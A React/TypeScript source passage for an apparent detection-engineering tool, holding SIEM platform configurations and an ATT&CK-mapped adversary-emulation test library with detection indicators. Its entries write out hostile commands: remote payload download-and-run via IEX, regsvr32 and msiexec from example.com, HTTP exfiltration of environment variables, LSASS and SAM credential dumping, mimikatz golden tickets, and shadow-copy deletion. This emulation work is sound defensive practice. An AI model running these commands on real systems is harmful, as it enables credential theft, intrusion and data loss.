import { useState, useMemo, useEffect, useCallback } from 'react';
import {
  Plus,
  Search,
  Filter,
  Play,
  Edit3,
  Trash2,
  Copy,
  CheckCircle,
  AlertTriangle,
  Clock,
  Shield,
  Zap,
  X,
  Save,
  Server,
  TrendingUp,
  Sparkles,
  Code,
  Check,
  Terminal,
  FileText,
  ShieldAlert,
  Brain,
  Globe,
  Cpu,
  Lock,
  Eye,
  Download,
  BookOpen,
  ChevronDown,
  ChevronRight,
  Settings,
  Target,
  Activity,
  FileCode,
  Binary,
  Network,
  Database,
  ExternalLink,
  Rocket,
  FlaskConical,
  Bug,
  TerminalSquare,
  Hammer,
  Radio,
  Crosshair,
  Sword,
  ScanLine,
  FileJson
} from 'lucide-react';

// ==========================================
// PLATFORM CONFIGURATIONS & PARSER REFERENCES
// ==========================================

const PLATFORMS = {
  splunk: {
    name: 'Splunk',
    language: 'SPL (Search Processing Language)',
    extension: 'spl',
    docs: [
      { title: 'props.conf', url: 'https://docs.splunk.com/Documentation/Splunk/latest/Admin/Propsconf' },
      { title: 'transforms.conf', url: 'https://docs.splunk.com/Documentation/Splunk/latest/Admin/Transformsconf' },
      { title: 'SPL Syntax', url: 'https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Syntax' }
    ],
    syntax: {
      comment: '#',
      wildcards: ['*'],
      operators: ['=', '!=', '<', '>', '<=', '>=', 'IN', 'NOT IN', 'LIKE', 'NOT LIKE'],
      functions: ['stats', 'eval', 'rex', 'where', 'search', 'transaction', 'join', 'lookup']
    }
  },
  qradar: {
    name: 'IBM QRadar',
    language: 'AQL (Ariel Query Language)',
    extension: 'aql',
    docs: [
      { title: 'DSM Editor Guide', url: 'https://www.ibm.com/docs/en/qsip/7.5?topic=devices-creating-custom-dsm' },
      { title: 'Custom Parsing', url: 'https://medium.com/@fraudas/simple-parsing-with-regex-on-ibm-qradar' }
    ],
    syntax: {
      comment: '--',
      wildcards: ['%', '_'],
      operators: ['=', '!=', '<', '>', '<=', '>=', 'IN', 'NOT IN', 'BETWEEN', 'LIKE', 'ILIKE'],
      functions: ['SELECT', 'FROM', 'WHERE', 'GROUP BY', 'ORDER BY', 'LIMIT', 'START', 'STOP']
    }
  },
  logrhythm: {
    name: 'LogRhythm',
    language: 'MPE (Message Processing Engine)',
    extension: 'xml',
    docs: [
      { title: 'MPE Rule Builder', url: 'https://docs.logrhythm.com/lrsiem/docs/message-processing-engine-rule-builder' },
      { title: 'Log Processing', url: 'https://docs.logrhythm.com/lrsiem/docs/log-processing' }
    ],
    syntax: {
      comment: '<!-- -->',
      wildcards: ['*', '?'],
      operators: ['=', '!=', 'Contains', 'Not Contains', 'Matches', 'Not Matches'],
      functions: ['Regex', 'LogRhythm Variable', 'Entity', 'Classification', 'CommonEvent']
    }
  },
  arcsight: {
    name: 'ArcSight',
    language: 'CEF (Common Event Format) / FlexConnectors',
    extension: 'cef',
    docs: [
      { title: 'CEF Implementation', url: 'https://www.microfocus.com/documentation/arcsight/arcsight-smartconnectors-24.2/pdfdoc/cef-implementation-standard/cef-implementation-standard.pdf' }
    ],
    syntax: {
      comment: '#',
      wildcards: ['*', '?'],
      operators: ['=', '!=', '<', '>', 'IN', 'NOT IN'],
      functions: ['CONCAT', 'SUBSTRING', 'REGEX', 'TIMESTAMP', 'GEOLOCATION']
    }
  },
  cortex: {
    name: 'Cortex XDR',
    language: 'XQL (XDR Query Language)',
    extension: 'xql',
    docs: [
      { title: 'XQL Documentation', url: 'https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Documentation/Get-started-with-XQL' }
    ],
    syntax: {
      comment: '//',
      wildcards: ['*'],
      operators: ['=', '!=', '<', '>', '<=', '>=', 'in', 'not in', 'contains', 'not contains'],
      functions: ['dataset', 'filter', 'fields', 'stats', 'bin', 'join', 'lookup']
    }
  },
  fidelis: {
    name: 'Fidelis EDR',
    language: 'Entity Query Language',
    extension: 'fql',
    docs: [
      { title: 'Fidelis EDR API', url: 'https://xsoar.pan.dev/docs/reference/integrations/fidelis-edr' }
    ],
    syntax: {
      comment: '--',
      wildcards: ['*', '?'],
      operators: ['=', '!=', '>', '<', 'and', 'or'],
      functions: ['process', 'file', 'dns', 'network', 'registry', 'script']
    }
  }
};

// ==========================================
// ATOMIC RED TEAM TESTS LIBRARY (100+ Tests)
// ==========================================

interface AtomicTest {
  id: string;
  technique: string;
  techniqueName: string;
  tactic: string;
  name: string;
  description: string;
  platforms: string[];
  executor: string;
  executorType: 'command_prompt' | 'powershell' | 'bash' | 'sh';
  cleanup?: string;
  requirements?: string[];
  elevationRequired: boolean;
  dependencies?: string[];
  difficulty: 'easy' | 'medium' | 'hard';
  impact: 'low' | 'medium' | 'high' | 'critical';
  detectionIndicators: string[];
}

const ATOMIC_TESTS: AtomicTest[] = [
  // Initial Access (T1566)
  {
    id: 'T1566.001-1',
    technique: 'T1566.001',
    techniqueName: 'Phishing: Spearphishing Attachment',
    tactic: 'Initial Access',
    name: 'Download Phishing Attachment',
    description: 'Simulates downloading a malicious attachment via PowerShell',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri "http://example.com/malicious.doc" -OutFile "$env:TEMP\\malicious.doc"',
    executorType: 'powershell',
    cleanup: 'Remove-Item "$env:TEMP\\malicious.doc" -ErrorAction Ignore',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['Invoke-WebRequest', 'http://example.com', 'malicious.doc', '$env:TEMP']
  },
  {
    id: 'T1566.001-2',
    technique: 'T1566.001',
    techniqueName: 'Phishing: Spearphishing Attachment',
    tactic: 'Initial Access',
    name: 'Macro Enabled Document',
    description: 'Creates a macro-enabled document with AutoOpen macro',
    platforms: ['windows'],
    executor: 'New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Word\\Security" -Name "AccessVBOM" -Value 1 -Force',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['AccessVBOM', 'Office\\Security', 'Macro']
  },

  // Execution (T1059)
  {
    id: 'T1059.001-1',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    tactic: 'Execution',
    name: 'PowerShell Encoded Command',
    description: 'Executes encoded PowerShell command commonly used by attackers',
    platforms: ['windows'],
    executor: 'powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['-enc', 'powershell', 'encodedcommand', 'U3RhcnQtU2xlZXAgLXMgMTA=']
  },
  {
    id: 'T1059.001-2',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    tactic: 'Execution',
    name: 'PowerShell Download String',
    description: 'Downloads and executes content from remote server using IEX',
    platforms: ['windows'],
    executor: 'IEX (New-Object Net.WebClient).downloadString("http://example.com/payload.ps1")',
    executorType: 'powershell',
    cleanup: 'Clear-History',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['IEX', 'downloadString', 'Net.WebClient', 'http://']
  },
  {
    id: 'T1059.001-3',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    tactic: 'Execution',
    name: 'PowerShell Hidden Window',
    description: 'Executes PowerShell with hidden window style',
    platforms: ['windows'],
    executor: 'powershell -WindowStyle hidden -Command "Write-Host "Malicious Activity""',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['-WindowStyle hidden', '-w hidden']
  },
  {
    id: 'T1059.001-4',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    tactic: 'Execution',
    name: 'PowerShell Non-Interactive',
    description: 'Executes PowerShell in non-interactive mode with bypass execution policy',
    platforms: ['windows'],
    executor: 'powershell -ExecutionPolicy Bypass -NonInteractive -Command "Get-Process"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['-ExecutionPolicy Bypass', '-NonInteractive', '-ep bypass']
  },
  {
    id: 'T1059.003-1',
    technique: 'T1059.003',
    techniqueName: 'Windows Command Shell',
    tactic: 'Execution',
    name: 'Batch File Execution',
    description: 'Executes malicious batch file',
    platforms: ['windows'],
    executor: 'cmd /c "echo calc.exe > %TEMP%\\malicious.bat && %TEMP%\\malicious.bat"',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\\malicious.bat',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['cmd /c', '.bat', '%TEMP%', 'echo calc.exe']
  },
  {
    id: 'T1059.005-1',
    technique: 'T1059.005',
    techniqueName: 'Visual Basic',
    tactic: 'Execution',
    name: 'VBScript Execution',
    description: 'Executes malicious VBScript',
    platforms: ['windows'],
    executor: 'cscript //nologo %TEMP%\\payload.vbs',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\\payload.vbs',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['cscript', '.vbs', 'wscript']
  },
  {
    id: 'T1059.007-1',
    technique: 'T1059.007',
    techniqueName: 'JavaScript/JScript',
    tactic: 'Execution',
    name: 'JScript via MSHTA',
    description: 'Executes JavaScript via MSHTA',
    platforms: ['windows'],
    executor: 'mshta javascript:alert("Atomic Test");close();',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['mshta', 'javascript:', 'vbscript:']
  },

  // Persistence (T1547)
  {
    id: 'T1547.001-1',
    technique: 'T1547.001',
    techniqueName: 'Registry Run Keys',
    tactic: 'Persistence',
    name: 'Run Key Persistence',
    description: 'Adds entry to Run registry key for persistence',
    platforms: ['windows'],
    executor: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /t REG_SZ /d "C:\\Windows\\System32\\calc.exe" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /f',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['reg add', '\\Run', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run']
  },
  {
    id: 'T1547.001-2',
    technique: 'T1547.001',
    techniqueName: 'Registry Run Keys',
    tactic: 'Persistence',
    name: 'RunOnce Key Persistence',
    description: 'Adds entry to RunOnce registry key',
    platforms: ['windows'],
    executor: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v AtomicTest /t REG_SZ /d "C:\\Windows\\System32\\notepad.exe" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v AtomicTest /f',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['reg add', '\\RunOnce']
  },
  {
    id: 'T1547.009-1',
    technique: 'T1547.009',
    techniqueName: 'Shortcut Modification',
    tactic: 'Persistence',
    name: 'Shortcut Hijacking',
    description: 'Modifies shortcut to execute malicious payload',
    platforms: ['windows'],
    executor: '$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("$env:TEMP\\test.lnk"); $Shortcut.TargetPath = "powershell.exe"; $Shortcut.Arguments = "-Command Write-Host Atomic"; $Shortcut.Save()',
    executorType: 'powershell',
    cleanup: 'Remove-Item "$env:TEMP\\test.lnk"',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['CreateShortcut', '.lnk', 'WScript.Shell']
  },
  {
    id: 'T1543.003-1',
    technique: 'T1543.003',
    techniqueName: 'Create or Modify System Process: Windows Service',
    tactic: 'Persistence',
    name: 'Create Windows Service',
    description: 'Creates a new Windows service for persistence',
    platforms: ['windows'],
    executor: 'sc create AtomicTest binPath= "C:\\Windows\\System32\\calc.exe" start= auto',
    executorType: 'command_prompt',
    cleanup: 'sc delete AtomicTest',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['sc create', 'binPath=', 'start= auto']
  },
  {
    id: 'T1546.003-1',
    technique: 'T1546.003',
    techniqueName: 'Event Triggered Execution: Windows Management Instrumentation Event Subscription',
    tactic: 'Persistence',
    name: 'WMI Event Subscription',
    description: 'Creates WMI event subscription for persistence',
    platforms: ['windows'],
    executor: 'wmic /NAMESPACE:"\\root\\subscription" PATH __EventFilter CREATE Name="AtomicTest", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
    executorType: 'command_prompt',
    cleanup: 'wmic /NAMESPACE:"\\root\\subscription" PATH __EventFilter WHERE Name="AtomicTest" DELETE',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['__EventFilter', 'ActiveScriptEventConsumer', 'CommandLineEventConsumer', 'root\\subscription']
  },

  // Privilege Escalation (T1055, T1078)
  {
    id: 'T1055.012-1',
    technique: 'T1055.012',
    techniqueName: 'Process Injection: Process Hollowing',
    tactic: 'Defense Evasion',
    name: 'Process Hollowing',
    description: 'Creates a process in a suspended state and replaces its memory with malicious code',
    platforms: ['windows'],
    executor: 'C:\\AtomicRedTeam\\atomics\\T1055.012\\bin\\x64\\T1055.012.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['CreateProcessA', 'NtUnmapViewOfSection', 'VirtualAllocEx', 'WriteProcessMemory']
  },
  {
    id: 'T1078.003-1',
    technique: 'T1078.003',
    techniqueName: 'Valid Accounts: Local Accounts',
    tactic: 'Initial Access',
    name: 'Local Account Login',
    description: 'Attempts to authenticate with local account',
    platforms: ['windows'],
    executor: 'runas /user:administrator cmd.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['runas', '/user:', 'LogonType 2', 'LogonType 9']
  },

  // Defense Evasion (T1027, T1218, T1202)
  {
    id: 'T1027.002-1',
    technique: 'T1027.002',
    techniqueName: 'Obfuscated Files or Information: Software Packing',
    tactic: 'Defense Evasion',
    name: 'UPX Packing',
    description: 'Packs executable with UPX packer',
    platforms: ['windows'],
    executor: 'upx -9 C:\\Windows\\System32\\calc.exe -o %TEMP%\\packed_calc.exe',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\\packed_calc.exe',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['UPX0', 'UPX1', '4D 5A', 'high entropy']
  },
  {
    id: 'T1218.001-1',
    technique: 'T1218.001',
    techniqueName: 'System Binary Proxy Execution: Compiled HTML File',
    tactic: 'Defense Evasion',
    name: 'CHM Execution',
    description: 'Executes commands via Compiled HTML Help file',
    platforms: ['windows'],
    executor: 'hh.exe %TEMP%\\payload.chm',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['hh.exe', '.chm', 'mk:@MSITStore']
  },
  {
    id: 'T1218.004-1',
    technique: 'T1218.004',
    techniqueName: 'System Binary Proxy Execution: InstallUtil',
    tactic: 'Defense Evasion',
    name: 'InstallUtil Execution',
    description: 'Executes payload via InstallUtil',
    platforms: ['windows'],
    executor: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\payload.dll',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['InstallUtil.exe', '/U', '/logfile=']
  },
  {
    id: 'T1218.005-1',
    technique: 'T1218.005',
    techniqueName: 'System Binary Proxy Execution: Mshta',
    tactic: 'Defense Evasion',
    name: 'Mshta Execute JavaScript',
    description: 'Executes JavaScript via mshta.exe',
    platforms: ['windows'],
    executor: 'mshta.exe "javascript:var sh=new ActiveXObject(\'WScript.Shell\');sh.Popup(\'AtomicTest\');close()"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['mshta.exe', 'javascript:', 'ActiveXObject']
  },
  {
    id: 'T1218.007-1',
    technique: 'T1218.007',
    techniqueName: 'System Binary Proxy Execution: Msiexec',
    tactic: 'Defense Evasion',
    name: 'Msiexec Remote Install',
    description: 'Installs MSI package from remote URL',
    platforms: ['windows'],
    executor: 'msiexec /q /i http://example.com/payload.msi',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['msiexec', '/i', 'http://', '.msi']
  },
  {
    id: 'T1218.010-1',
    technique: 'T1218.010',
    techniqueName: 'System Binary Proxy Execution: Regsvr32',
    tactic: 'Defense Evasion',
    name: 'Regsvr32 Script Execution',
    description: 'Executes script via regsvr32 (Squiblytwo)',
    platforms: ['windows'],
    executor: 'regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['regsvr32', '/i:http', 'scrobj.dll', '.sct']
  },
  {
    id: 'T1218.011-1',
    technique: 'T1218.011',
    techniqueName: 'System Binary Proxy Execution: Rundll32',
    tactic: 'Defense Evasion',
    name: 'Rundll32 Execute JavaScript',
    description: 'Executes JavaScript via rundll32',
    platforms: ['windows'],
    executor: 'rundll32.exe javascript:..mshtml,RunHTMLApplication alert("AtomicTest");',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['rundll32.exe', 'javascript:', 'vbscript:', 'mshtml']
  },
  {
    id: 'T1202-1',
    technique: 'T1202',
    techniqueName: 'Indirect Command Execution',
    tactic: 'Defense Evasion',
    name: 'Forfiles Indirect Execution',
    description: 'Executes command via forfiles.exe',
    platforms: ['windows'],
    executor: 'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "C:\\Windows\\System32\\calc.exe"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['forfiles', '/c', 'cmd /c']
  },
  {
    id: 'T1070.004-1',
    technique: 'T1070.004',
    techniqueName: 'Indicator Removal: File Deletion',
    tactic: 'Defense Evasion',
    name: 'Delete Prefetch File',
    description: 'Deletes prefetch file to cover tracks',
    platforms: ['windows'],
    executor: 'del /q /f /s %SystemRoot%\\Prefetch\\*',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['del', 'Prefetch', '/q /f /s']
  },

  // Credential Access (T1003, T1558)
  {
    id: 'T1003.001-1',
    technique: 'T1003.001',
    techniqueName: 'OS Credential Dumping: LSASS Memory',
    tactic: 'Credential Access',
    name: 'LSASS Memory Dump (comsvcs)',
    description: 'Dumps LSASS memory using comsvcs.dll',
    platforms: ['windows'],
    executor: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id %TEMP%\\lsass.dmp full',
    executorType: 'powershell',
    cleanup: 'del %TEMP%\\lsass.dmp',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['comsvcs.dll', 'MiniDump', 'lsass.dmp', 'rundll32']
  },
  {
    id: 'T1003.001-2',
    technique: 'T1003.001',
    techniqueName: 'OS Credential Dumping: LSASS Memory',
    tactic: 'Credential Access',
    name: 'LSASS Memory Dump (Task Manager)',
    description: 'Creates memory dump of LSASS via taskmgr',
    platforms: ['windows'],
    executor: 'taskmgr.exe',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['taskmgr.exe', 'CreateDumpFile', 'lsass.exe']
  },
  {
    id: 'T1003.002-1',
    technique: 'T1003.002',
    techniqueName: 'OS Credential Dumping: Security Account Manager',
    tactic: 'Credential Access',
    name: 'SAM Database Dump',
    description: 'Dumps SAM database using reg.exe',
    platforms: ['windows'],
    executor: 'reg save HKLM\\sam %TEMP%\\sam.hive && reg save HKLM\\system %TEMP%\\system.hive',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\\sam.hive %TEMP%\\system.hive',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['reg save', 'HKLM\\sam', 'sam.hive']
  },
  {
    id: 'T1558.001-1',
    technique: 'T1558.001',
    techniqueName: 'Steal or Forge Kerberos Tickets: Golden Ticket',
    tactic: 'Credential Access',
    name: 'Kerberos Golden Ticket',
    description: 'Creates Kerberos golden ticket using mimikatz',
    platforms: ['windows'],
    executor: 'mimikatz.exe "kerberos::golden /user:Administrator /domain:atomic.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:12345678901234567890123456789012 /ticket:golden.kirbi" exit',
    executorType: 'command_prompt',
    elevationRequired: true,
    dependencies: ['mimikatz.exe'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['mimikatz', 'kerberos::golden', 'krbtgt', 'golden.kirbi']
  },
  {
    id: 'T1558.003-1',
    technique: 'T1558.003',
    techniqueName: 'Steal or Forge Kerberos Tickets: Kerberoasting',
    tactic: 'Credential Access',
    name: 'Kerberoasting Attack',
    description: 'Requests service tickets for offline cracking',
    platforms: ['windows'],
    executor: 'Add-Type -AssemblyName System.IdentitySystem; $SPN = New-Object System.IdentitySystem.Protocols.Kerberos.KerberosRequestor; $SPN.GetRequest("HTTP/atomic.local")',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['KerberosRequestor', 'GetRequest', 'Service Ticket', 'RC4-HMAC']
  },

  // Discovery (T1083, T1057, T1012)
  {
    id: 'T1083-1',
    technique: 'T1083',
    techniqueName: 'File and Directory Discovery',
    tactic: 'Discovery',
    name: 'Enumerate User Directories',
    description: 'Enumerates user directories for sensitive files',
    platforms: ['windows'],
    executor: 'dir /s /b %USERPROFILE%\\Documents\\*.pdf %USERPROFILE%\\Documents\\*.docx',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['dir /s /b', '*.pdf', '*.docx', '*.xlsx']
  },
  {
    id: 'T1057-1',
    technique: 'T1057',
    techniqueName: 'Process Discovery',
    tactic: 'Discovery',
    name: 'List Running Processes',
    description: 'Lists all running processes',
    platforms: ['windows'],
    executor: 'tasklist /v /fo csv',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['tasklist', 'Get-Process', 'wmic process list']
  },
  {
    id: 'T1012-1',
    technique: 'T1012',
    techniqueName: 'Query Registry',
    tactic: 'Discovery',
    name: 'Query Registry for Passwords',
    description: 'Searches registry for password-related keys',
    platforms: ['windows'],
    executor: 'reg query HKLM /f password /t REG_SZ /s',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['reg query', '/f password', '/f pwd']
  },
  {
    id: 'T1518.001-1',
    technique: 'T1518.001',
    techniqueName: 'Software Discovery: Security Software Discovery',
    tactic: 'Discovery',
    name: 'Discover Antivirus Products',
    description: 'Discovers installed antivirus products',
    platforms: ['windows'],
    executor: 'wmic /NAMESPACE:\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /ALL /FORMAT:LIST',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['SecurityCenter2', 'AntiVirusProduct', 'AntiSpywareProduct']
  },

  // Lateral Movement (T1021, T1077)
  {
    id: 'T1021.002-1',
    technique: 'T1021.002',
    techniqueName: 'Remote Services: SMB/Windows Admin Shares',
    tactic: 'Lateral Movement',
    name: 'SMB Copy and Execute',
    description: 'Copies and executes file via SMB admin share',
    platforms: ['windows'],
    executor: 'net use \\target\\c$ /user:administrator password && copy payload.exe \\target\\c$\\windows\\temp\ && wmic /node:target process call create "c:\\windows\\temp\\payload.exe"',
    executorType: 'command_prompt',
    cleanup: 'del \\target\\c$\\windows\\temp\\payload.exe',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['net use', 'admin$', 'C$', 'IPC$', 'wmic /node']
  },
  {
    id: 'T1021.006-1',
    technique: 'T1021.006',
    techniqueName: 'Remote Services: Windows Remote Management',
    tactic: 'Lateral Movement',
    name: 'WinRM Remote Command',
    description: 'Executes command on remote system via WinRM',
    platforms: ['windows'],
    executor: 'Invoke-Command -ComputerName target -ScriptBlock { whoami }',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['Invoke-Command', 'WinRM', 'Microsoft-Windows-WinRM']
  },
  {
    id: 'T1077.001-1',
    technique: 'T1077.001',
    techniqueName: 'Application Layer Protocol: Web Protocols',
    tactic: 'Command and Control',
    name: 'HTTP POST Data Exfil',
    description: 'Exfiltrates data via HTTP POST request',
    platforms: ['windows'],
    executor: 'Invoke-RestMethod -Uri http://example.com/exfil -Method POST -Body (Get-ChildItem env:)',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Invoke-RestMethod', 'POST', 'http://', 'exfil']
  },

  // Collection (T1560, T1119, T1056)
  {
    id: 'T1560-1',
    technique: 'T1560',
    techniqueName: 'Archive Collected Data',
    tactic: 'Collection',
    name: 'Archive via WinRAR',
    description: 'Archives files for exfiltration using WinRAR',
    platforms: ['windows'],
    executor: 'winrar a -r -hp[password] %TEMP%\\collection.rar %USERPROFILE%\\Documents\\',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\\collection.rar',
    elevationRequired: false,
    dependencies: ['WinRAR'],
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['winrar', '7z.exe', 'compress-archive', '.rar', '.zip']
  },
  {
    id: 'T1119-1',
    technique: 'T1119',
    techniqueName: 'Automated Collection',
    tactic: 'Collection',
    name: 'Automated File Collection',
    description: 'Automatically collects files matching criteria',
    platforms: ['windows'],
    executor: 'Get-ChildItem -Path %USERPROFILE% -Include *.doc,*.xls,*.pdf -Recurse | Copy-Item -Destination %TEMP%\\collection\\',
    executorType: 'powershell',
    cleanup: 'Remove-Item %TEMP%\\collection -Recurse -Force',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Get-ChildItem', '-Include *.doc', 'Copy-Item', 'robocopy']
  },
  {
    id: 'T1056.001-1',
    technique: 'T1056.001',
    techniqueName: 'Input Capture: Keylogging',
    tactic: 'Collection',
    name: 'PowerShell Keylogger',
    description: 'Captures keystrokes using PowerShell',
    platforms: ['windows'],
    executor: 'Add-Type -TypeDefinition (Get-Content keylogger.cs | Out-String); [KeyLogger]::Main()',
    executorType: 'powershell',
    elevationRequired: false,
    dependencies: ['keylogger.cs'],
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['GetAsyncKeyState', 'keylogger', 'SetWindowsHookEx']
  },

  // Command and Control (T1071, T1573, T1001)
  {
    id: 'T1071.001-1',
    technique: 'T1071.001',
    techniqueName: 'Application Layer Protocol: Web Protocols',
    tactic: 'Command and Control',
    name: 'DNS over HTTPS',
    description: 'Uses DNS over HTTPS for C2 communication',
    platforms: ['windows'],
    executor: 'curl -s https://cloudflare-dns.com/dns-query?name=atomic-test.com --header "accept: application/dns-json"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['cloudflare-dns.com', 'dns-query', 'application/dns-json']
  },
  {
    id: 'T1573.001-1',
    technique: 'T1573.001',
    techniqueName: 'Encrypted Channel: Symmetric Cryptography',
    tactic: 'Command and Control',
    name: 'Encrypted C2 Channel',
    description: 'Establishes encrypted C2 channel using AES',
    platforms: ['windows'],
    executor: 'powershell -Command "$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $AES.GenerateKey(); IEX (New-Object Net.WebClient).DownloadString(\'https://example.com/c2.ps1\')"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['AesCryptoServiceProvider', 'GenerateKey', 'TransformFinalBlock']
  },

  // Impact (T1490, T1486, T1499)
  {
    id: 'T1490-1',
    technique: 'T1490',
    techniqueName: 'Inhibit System Recovery',
    tactic: 'Impact',
    name: 'Delete Shadow Copies',
    description: 'Deletes volume shadow copies to prevent recovery',
    platforms: ['windows'],
    executor: 'vssadmin delete shadows /all /quiet',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['vssadmin', 'delete shadows', '/all', 'wmic shadowcopy delete']
  },
  {
    id: 'T1490-2',
    technique: 'T1490',
    techniqueName: 'Inhibit System Recovery',
    tactic: 'Impact',
    name: 'Delete Windows Backup Catalog',
    description: 'Deletes Windows backup catalog',
    platforms: ['windows'],
    executor: 'wbadmin delete catalog -quiet',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['wbadmin', 'delete catalog']
  },
  {
    id: 'T1486-1',
    technique: 'T1486',
    techniqueName: 'Data Encrypted for Impact',
    tactic: 'Impact',
    name: 'Encrypt User Files',
    description: 'Encrypts user files with extension change',
    platforms: ['windows'],
    executor: 'Get-ChildItem -Path %USERPROFILE%\\Documents -Include *.doc,*.pdf -Recurse | Rename-Item -NewName { $_.Name + ".encrypted" }',
    executorType: 'powershell',
